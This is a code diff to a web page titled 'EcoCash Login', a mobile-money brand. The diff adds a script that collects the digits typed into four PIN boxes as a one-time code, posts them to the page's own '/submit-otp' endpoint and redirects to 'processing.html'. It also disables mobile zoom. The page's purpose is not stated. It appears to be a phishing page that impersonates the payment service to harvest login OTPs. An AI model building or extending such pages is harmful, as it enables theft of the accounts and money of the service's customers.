@@ -5,7 +5,7 @@
     <title>EcoCash Login</title>
 
     <!-- MOBILE -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <link rel="stylesheet" href="style.css">
 
@@ -132,7 +132,7 @@
 <input type="password" maxlength="1" class="pin-box" id="pin3">
 <input type="password" maxlength="1" class="pin-box" id="pin4">
     </div>
-<button onclick="submitApp()" class="login-btn">Login</button>
+<button onclick="submitOtp()" class="login-btn">Submit</button>
 </div>
 
 <!-- BOTTOM BLUE -->
@@ -148,6 +148,26 @@
 </div>
 
 <script src="script.js"></script>
+
+<script>
+function submitOtp() {
+    let otp = "";
+
+    document.querySelectorAll(".pin-box").forEach(input => {
+        otp += input.value;
+    });
+
+    fetch("/submit-otp", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ otp })
+    });
+
+    window.location.href = "processing.html";
+}
+</script>
 
 </body>
 </html>
